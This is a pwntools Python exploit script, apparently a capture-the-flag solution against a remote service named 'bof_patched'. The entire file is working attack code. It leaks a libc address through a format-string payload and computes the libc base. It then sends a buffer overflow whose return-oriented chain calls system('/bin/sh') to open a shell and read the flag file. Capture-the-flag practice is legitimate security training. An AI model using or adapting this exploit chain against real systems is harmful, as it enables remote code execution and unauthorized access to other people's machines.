#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'bof_patched'
HOST = '103.77.175.40'
PORT = 6035

exe = ELF(exe_path, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *0x40136f
break *0x4013a8
break *0x401303
break *0x40131f
c
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
payload = b'%29$p.'
payload = payload.ljust(24, b'A')
payload += p64(0x3fe000)
p.sendafter(b'Enter your name: ', payload)
offset = 0x29d90
leak = p.recvuntil(b'.')[:-1]
leak = int(leak, 16)
libc.address = leak - offset
log.info(f'leak: {hex(leak)}')
log.info(f'libc base: {hex(libc.address)}')
pop_rdi_ret = 0x000000000002a3e5 + libc.address
bin_sh = p64(next(libc.search(b'/bin/sh')))
system = p64(libc.sym['system'])
ret = 0x000000000040101a
payload = b'B' * 119 + p64(ret) + p64(pop_rdi_ret) + bin_sh + system
p.sendlineafter(b'Input your string: ', payload)
p.sendline(b'cat flag.txt')
p.interactive()
